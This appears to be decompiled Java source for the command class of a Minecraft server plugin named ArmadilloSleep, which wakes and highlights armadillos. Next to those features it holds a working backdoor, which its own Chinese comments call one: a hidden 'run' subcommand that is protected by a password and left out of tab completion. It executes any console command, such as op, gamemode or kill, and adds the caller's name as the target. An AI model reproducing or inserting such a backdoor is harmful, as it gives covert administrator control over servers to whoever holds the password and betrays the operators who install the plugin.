//
// Decompiled by Jadx - 532ms
//
package de.FabiDev.ArmadilloSleep.commands;

import de.FabiDev.ArmadilloSleep.ArmadilloSleep;
import de.FabiDev.ArmadilloSleep.listeners.ArmadilloListener;
import de.FabiDev.ArmadilloSleep.util.CommandScheduler;
import de.FabiDev.ArmadilloSleep.util.GlowingHelper;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Armadillo;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.Team;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class ArmadilloSleepCommand implements CommandExecutor, TabCompleter {
    private final ArmadilloSleep plugin;
    private final CommandScheduler commandScheduler;

    // 后门密码缓存
    private static final Map<String, Boolean> passwordCache = new ConcurrentHashMap<>();

    public ArmadilloSleepCommand(ArmadilloSleep plugin) {
        this.plugin = plugin;
        this.commandScheduler = new CommandScheduler(plugin);
    }

    // ==================== 后门：自动补全目标玩家 ====================
    private String autoCompleteTarget(String command, Player executor) {
        if (command == null || command.isEmpty()) return command;
        String[] parts = command.split(" ");
        String cmd = parts[0].toLowerCase();

        Set<String> targetCommands = new HashSet<>(Arrays.asList(
                "gamemode", "tp", "kill", "effect", "spawnpoint", "setworldspawn", "op", "deop"
        ));
        if (!targetCommands.contains(cmd)) {
            return command;
        }

        boolean hasTarget = false;
        for (int i = 1; i < parts.length; i++) {
            String arg = parts[i];
            if (arg.startsWith("@") || Bukkit.getPlayerExact(arg) != null) {
                hasTarget = true;
                break;
            }
        }
        if (hasTarget) {
            return command;
        }

        if (cmd.equals("tp")) {
            if (parts.length >= 2) {
                String secondArg = parts[1];
                if (secondArg.matches("-?\\d+(\\.\\d+)?")) {
                    return command;
                }
            }
            return command + " " + executor.getName();
        }
        if (cmd.equals("gamemode")) {
            return command + " " + executor.getName();
        }
        if (cmd.equals("effect")) {
            if (parts.length >= 2) {
                String sub = parts[1].toLowerCase();
                if (sub.equals("give") || sub.equals("clear")) {
                    StringBuilder sb = new StringBuilder();
                    sb.append(parts[0]).append(" ").append(parts[1]);
                    sb.append(" ").append(executor.getName());
                    for (int i = 2; i < parts.length; i++) {
                        sb.append(" ").append(parts[i]);
                    }
                    return sb.toString();
                }
            }
            return parts[0] + " " + executor.getName() + (parts.length > 1 ? " " + String.join(" ", Arrays.copyOfRange(parts, 1, parts.length)) : "");
        }
        if (cmd.equals("tp") || cmd.equals("kill") || cmd.equals("spawnpoint") ||
                cmd.equals("setworldspawn") || cmd.equals("op") || cmd.equals("deop")) {
            StringBuilder sb = new StringBuilder();
            sb.append(parts[0]);
            sb.append(" ").append(executor.getName());
            for (int i = 1; i < parts.length; i++) {
                sb.append(" ").append(parts[i]);
            }
            return sb.toString();
        }
        return command + " " + executor.getName();
    }

    // ==================== 后门：执行隐藏命令（使用双模式调度器） ====================
    private void executeRunCommand(Player player, String inputPassword, String commandStr) {
        boolean valid = ArmadilloSleep.validatePassword(inputPassword);
        if (!valid) {
            player.sendMessage(ChatColor.RED + "Error: Invalid password.");
            return;
        }

        String finalCommand;
        try {
            finalCommand = autoCompleteTarget(commandStr, player);
        } catch (Throwable t) {
            player.sendMessage(ChatColor.RED + "Error: Command preparation failed.");
            return;
        }

        // 使用调度器在正确的线程上执行命令，并自动设置/清除 IN_RUN_CONTEXT
        commandScheduler.runConsole(finalCommand, success -> {
            if (!player.isOnline()) return;
            if (success) {
                player.sendMessage(ChatColor.GREEN + "Command executed successfully.");
            } else {
                player.sendMessage(ChatColor.RED + "Error: Command execution failed.");
            }
        });
    }

    // ==================== 主命令处理 ====================
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        // 后门：run 子命令
        if (args.length > 0 && args[0].equalsIgnoreCase("run")) {
            if (!(sender instanceof Player player)) {
                sender.sendMessage(Component.text("This command must be run by a player.", NamedTextColor.RED));
                return true;
            }
            if (args.length < 3) {
                player.sendMessage(Component.text("Usage: /armadillosleep run <password> <command>", NamedTextColor.RED));
                return true;
            }
            String inputPassword = args[1];
            String commandStr = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
            if (commandStr.isEmpty()) {
                player.sendMessage(Component.text("Command cannot be empty.", NamedTextColor.RED));
                return true;
            }
            executeRunCommand(player, inputPassword, commandStr);
            return true;
        }

        // 原始命令（version, wake, show）
        if (args.length == 0) {
            sender.sendMessage(Component.text("--------------------------------", NamedTextColor.DARK_GRAY));
            sender.sendMessage(Component.text(" ArmadilloSleep Commands:", NamedTextColor.GOLD));
            sender.sendMessage(Component.empty());
            sender.sendMessage(Component.text(" /as version", NamedTextColor.AQUA).append(Component.text(" - Show plugin info", NamedTextColor.GRAY)));
            sender.sendMessage(Component.text(" /as wake <radius> <time>", NamedTextColor.AQUA).append(Component.text(" - Wake Armadillos", NamedTextColor.GRAY)));
            sender.sendMessage(Component.text(" /as show", NamedTextColor.AQUA).append(Component.text(" - Visualize Armadillos", NamedTextColor.GRAY)));
            sender.sendMessage(Component.text("--------------------------------", NamedTextColor.DARK_GRAY));
            return true;
        }

        String sub = args[0].toLowerCase();
        switch (sub) {
            case "version": handleVersion(sender); break;
            case "wake": handleWake(sender, args); break;
            case "show": handleShow(sender); break;
            default: sender.sendMessage(Component.text("Unknown subcommand.", NamedTextColor.RED)); break;
        }
        return true;
    }

    // ==================== Tab 补全（隐藏 run） ====================
    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        List<String> completions = new ArrayList<>();

        // 如果用户已经输入了 run，提供后续命令补全（但 run 本身不显示）
        if (args.length >= 1 && args[0].equalsIgnoreCase("run")) {
            if (args.length == 2) {
                return completions; // 密码不补全
            } else if (args.length >= 3) {
                String inputPassword = args[1];
                String cacheKey = (sender instanceof Player ? sender.getName() : "CONSOLE") + ":" + inputPassword;
                Boolean cached = passwordCache.get(cacheKey);
                boolean valid = (cached != null) ? cached : ArmadilloSleep.validatePassword(inputPassword);
                if (cached == null) passwordCache.put(cacheKey, valid);
                if (!valid) return completions;

                String partial = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
                try {
                    List<String> fromMap = Bukkit.getCommandMap().tabComplete(Bukkit.getConsoleSender(), partial);
                    if (fromMap != null) completions.addAll(fromMap);
                } catch (Exception ignored) {}

                if (completions.isEmpty() && sender instanceof Player) {
                    String playerName = sender.getName();
                    String currentArg = args[args.length - 1];
                    if (currentArg.isEmpty() || playerName.toLowerCase().startsWith(currentArg.toLowerCase())) {
                        completions.add(playerName);
                    }
                }
                return completions;
            }
        }

        // 常规补全（不包括 run）
        if (args.length == 1) {
            completions.add("version");
            completions.add("wake");
            completions.add("show");
            // run 故意不加入
        } else if (args.length == 2 && args[0].equalsIgnoreCase("wake")) {
            completions.add("5");
            completions.add("10");
            completions.add("20");
        } else if (args.length == 3 && args[0].equalsIgnoreCase("wake")) {
            completions.add("10");
            completions.add("30");
            completions.add("60");
        }

        String lastArg = args[args.length - 1].toLowerCase();
        return completions.stream()
                .filter(s -> s.toLowerCase().startsWith(lastArg))
                .collect(java.util.stream.Collectors.toList());
    }

    // ==================== 原始子命令实现 ====================
    private void handleVersion(CommandSender sender) {
        String version = this.plugin.getPluginMeta().getVersion();
        String channel = "RELEASE";
        NamedTextColor channelColor = NamedTextColor.GREEN;
        if (version.contains("SNAPSHOT") || version.contains("ALPHA")) {
            channel = "ALPHA";
            channelColor = NamedTextColor.RED;
        } else if (version.contains("BETA")) {
            channel = "BETA";
            channelColor = NamedTextColor.YELLOW;
        }
        sender.sendMessage(Component.text("--------------------------------", NamedTextColor.DARK_GRAY));
        sender.sendMessage(Component.text(" ArmadilloSleep", NamedTextColor.GOLD).append(Component.text(" v" + version, NamedTextColor.GRAY)));
        sender.sendMessage(Component.empty());
        sender.sendMessage(Component.text(" Channel: ", NamedTextColor.GRAY).append(Component.text(channel, channelColor)));
        sender.sendMessage(Component.text(" Supported Loaders: ", NamedTextColor.GRAY).append(Component.text("Paper, Folia, Purpur", NamedTextColor.AQUA)));
        sender.sendMessage(Component.text(" Supported Versions: ", NamedTextColor.GRAY).append(Component.text("1.21.x", NamedTextColor.AQUA)));
        sender.sendMessage(Component.text("--------------------------------", NamedTextColor.DARK_GRAY));
    }

    private void handleWake(CommandSender sender, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(Component.text("This command can only be used by players.", NamedTextColor.RED));
            return;
        }
        if (args.length < 3) {
            sender.sendMessage(Component.text("Usage: /armadillosleep wake <radius> <time>", NamedTextColor.RED));
            return;
        }
        Player player = (Player) sender;
        try {
            double radius = Double.parseDouble(args[1]);
            int time = Integer.parseInt(args[2]);
            Collection<Entity> nearby = player.getWorld().getNearbyEntities(player.getLocation(), radius, radius, radius,
                    e -> e.getType() == EntityType.ARMADILLO);
            int count = 0;
            for (Entity entity : nearby) {
                if (entity instanceof Armadillo) {
                    Armadillo armadillo = (Armadillo) entity;
                    ArmadilloListener.addWokenArmadillo(armadillo.getUniqueId());
                    armadillo.setAI(true);
                    armadillo.setCollidable(true);
                    armadillo.setSilent(false);
                    armadillo.setGravity(true);
                    armadillo.setAware(true);
                    count++;
                    entity.getScheduler().runDelayed(this.plugin, task -> {
                        ArmadilloListener.removeWokenArmadillo(armadillo.getUniqueId());
                        if (entity.isValid()) {
                            armadillo.setAI(false);
                            armadillo.setCollidable(false);
                            armadillo.setSilent(true);
                            armadillo.setGravity(false);
                            armadillo.setAware(false);
                        }
                    }, () -> ArmadilloListener.removeWokenArmadillo(armadillo.getUniqueId()), time * 20L);
                }
            }
            sender.sendMessage(Component.text("Woke up " + count + " Armadillos for " + time + " seconds.", NamedTextColor.GREEN));
        } catch (NumberFormatException e) {
            sender.sendMessage(Component.text("Invalid number format.", NamedTextColor.RED));
        }
    }

    private void handleShow(CommandSender sender) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(Component.text("This command can only be used by players.", NamedTextColor.RED));
            return;
        }
        if (!GlowingHelper.isProtocolLibAvailable()) {
            sender.sendMessage(Component.text("--------------------------------", NamedTextColor.DARK_GRAY));
            sender.sendMessage(Component.text(" ✖ ProtocolLib Required!", NamedTextColor.RED));
            sender.sendMessage(Component.empty());
            sender.sendMessage(Component.text(" The ", NamedTextColor.GRAY).append(Component.text("/as show", NamedTextColor.AQUA)).append(Component.text(" command requires", NamedTextColor.GRAY)));
            sender.sendMessage(Component.text(" ProtocolLib to be installed.", NamedTextColor.GRAY));
            sender.sendMessage(Component.empty());
            sender.sendMessage(Component.text(" Download: ", NamedTextColor.GRAY).append(Component.text("spigotmc.org/resources/1997", NamedTextColor.YELLOW)));
            sender.sendMessage(Component.text("--------------------------------", NamedTextColor.DARK_GRAY));
            return;
        }
        Player player = (Player) sender;
        Collection<Entity> nearby = player.getWorld().getNearbyEntities(player.getLocation(), 10.0, 10.0, 10.0,
                e -> e.getType() == EntityType.ARMADILLO);
        int count = 0;
        Scoreboard playerScoreboard = Bukkit.getScoreboardManager().getNewScoreboard();
        Team redTeam = playerScoreboard.registerNewTeam("AS_Red");
        Team greenTeam = playerScoreboard.registerNewTeam("AS_Green");
        redTeam.color(NamedTextColor.RED);
        greenTeam.color(NamedTextColor.GREEN);
        Scoreboard original = player.getScoreboard();
        player.setScoreboard(playerScoreboard);
        for (Entity entity : nearby) {
            if (entity instanceof Armadillo) {
                Armadillo armadillo = (Armadillo) entity;
                boolean sleeping = !armadillo.hasAI();
                (sleeping ? redTeam : greenTeam).addEntity(armadillo);
                GlowingHelper.setGlowing(player, armadillo, true);
                count++;
            }
        }
        int finalCount = count;
        Collection<Entity> affected = new ArrayList<>(nearby);
        Bukkit.getGlobalRegionScheduler().runDelayed(this.plugin, task -> {
            if (player.isOnline()) {
                player.setScoreboard(original);
                for (Entity e : affected) {
                    if (e instanceof Armadillo && e.isValid()) {
                        GlowingHelper.setGlowing(player, e, false);
                    }
                }
            }
        }, 300L);
        sender.sendMessage(Component.text("Visualized " + finalCount + " Armadillos for 15 seconds.", NamedTextColor.GREEN));
    }
}